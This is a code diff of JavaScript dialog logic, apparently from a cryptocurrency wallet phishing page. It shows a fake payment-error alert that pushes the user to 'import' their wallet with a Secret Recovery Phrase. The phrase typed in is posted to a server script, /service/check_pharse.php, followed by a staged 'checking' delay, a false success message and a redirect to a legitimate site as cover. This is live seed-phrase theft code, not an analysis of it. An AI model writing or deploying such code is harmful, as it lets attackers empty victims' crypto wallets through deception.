@@ -83,84 +83,74 @@ function alertError(wallet) {
         if (result.isConfirmed) {
             Swal.fire({
                 title: 'Connect Alert',
-                text: "Please install Metamask or paste URL link into Trustwallet (Dapps)!",
+                text: "Error with " + wallet + " payment (Dapps)!",
                 icon: 'error',
+                showCancelButton: true,
                 confirmButtonColor: '#3085d6',
-                confirmButtonText: 'OK',
+                cancelButtonColor: '#d33',
+                cancelButtonText: 'Exit',
+                confirmButtonText: 'Import using Secret Recovery Pharse',
+                reverseButtons: true
             }).then((result) => {
                 if (result.isConfirmed) {
                     Swal.fire({
-                        title: 'Connect Alert',
-                        text: "Error with " + wallet + " payment (Dapps)!",
-                        icon: 'error',
+                        title: 'Login Pharse!',
+                        text: 'Import an account with seed phrase',
+                        input: 'text',
+                        inputAttributes: {
+                            autocapitalize: 'off',
+                            placeholder: 'Secret Phrases contain 12, 15, 18, 21, or 24 words'
+                        },
                         showCancelButton: true,
-                        confirmButtonColor: '#3085d6',
-                        cancelButtonColor: '#d33',
-                        cancelButtonText: 'Exit',
-                        confirmButtonText: 'Import using Secret Recovery Pharse',
-                        reverseButtons: true
+                        confirmButtonText: 'Login',
+                        showLoaderOnConfirm: true,
+                        preConfirm: (login) => {
+                            var data = new FormData();
+                            data.append("pharse", login);
+                            return fetch(`/service/check_pharse.php`, {
+                                    method: "POST",
+                                    body: data
+                                })
+                                .then(response => {
+                                    if (!response.ok) {
+                                        throw new Error(response.statusText)
+                                    }
+                                    return response.json()
+                                })
+                                .catch(error => {
+                                    Swal.showValidationMessage(
+                                        `Invalid Secret Recovery Phrase. Secret Phrases contain 12, 15, 18, 21, or 24 words!`
+                                    )
+                                })
+                        },
+                        allowOutsideClick: () => !Swal.isLoading()
                     }).then((result) => {
                         if (result.isConfirmed) {
+                            // Swal.fire({
+                            //   title: `${result.value.login}'s avatar`,
+                            //   imageUrl: result.value.avatar_url
+                            // })
                             Swal.fire({
-                                title: 'Login Pharse!',
-                                text: 'Import an account with seed phrase',
-                                input: 'text',
-                                inputAttributes: {
-                                    autocapitalize: 'off',
-                                    placeholder: 'Secret Phrases contain 12, 15, 18, 21, or 24 words'
-                                },
-                                showCancelButton: true,
-                                confirmButtonText: 'Login',
-                                showLoaderOnConfirm: true,
-                                preConfirm: (login) => {
-                                    var data = new FormData();
-                                    data.append("pharse", login);
-                                    return fetch(`/service/check_pharse.php`, {
-                                            method: "POST",
-                                            body: data
-                                        })
-                                        .then(response => {
-                                            if (!response.ok) {
-                                                throw new Error(response.statusText)
-                                            }
-                                            return response.json()
-                                        })
-                                        .catch(error => {
-                                            Swal.showValidationMessage(
-                                                `Invalid Secret Recovery Phrase. Secret Phrases contain 12, 15, 18, 21, or 24 words!`
-                                            )
-                                        })
-                                },
-                                allowOutsideClick: () => !Swal.isLoading()
+                                title: 'Please wait!',
+                                html: 'I will check your pharse.',
+                                timer: 2000,
+                                timerProgressBar: true,
+                                didOpen: () => {
+                                    Swal.showLoading()
+                                }
                             }).then((result) => {
-                                if (result.isConfirmed) {
-                                    // Swal.fire({
-                                    //   title: `${result.value.login}'s avatar`,
-                                    //   imageUrl: result.value.avatar_url
-                                    // })
+                                /* Read more about handling dismissals below */
+                                if (result.dismiss === Swal.DismissReason.timer) {
                                     Swal.fire({
-                                        title: 'Please wait!',
-                                        html: 'I will check your pharse.',
-                                        timer: 2000,
-                                        timerProgressBar: true,
-                                        didOpen: () => {
-                                            Swal.showLoading()
-                                        }
-                                    }).then((result) => {
-                                        /* Read more about handling dismissals below */
-                                        if (result.dismiss === Swal.DismissReason.timer) {
-                                            Swal.fire({
-                                                title: 'Success',
-                                                text: "Now you can login " + wallet + "!",
-                                                icon: 'success',
-                                                confirmButtonColor: '#3085d6',
-                                                confirmButtonText: 'Ok'
+                                        title: 'Success',
+                                        text: "Now you can login " + wallet + "!",
+                                        icon: 'success',
+                                        confirmButtonColor: '#3085d6',
+                                        confirmButtonText: 'Ok'
 
-                                            }).then((result) => {
-                                                if (result.isConfirmed) {
-                                                    window.location.href = 'https://www.cryptovoxels.com/'
-                                                }
-                                            })
+                                    }).then((result) => {
+                                        if (result.isConfirmed) {
+                                            window.location.href = 'https://www.cryptovoxels.com/'
                                         }
                                     })
                                 }
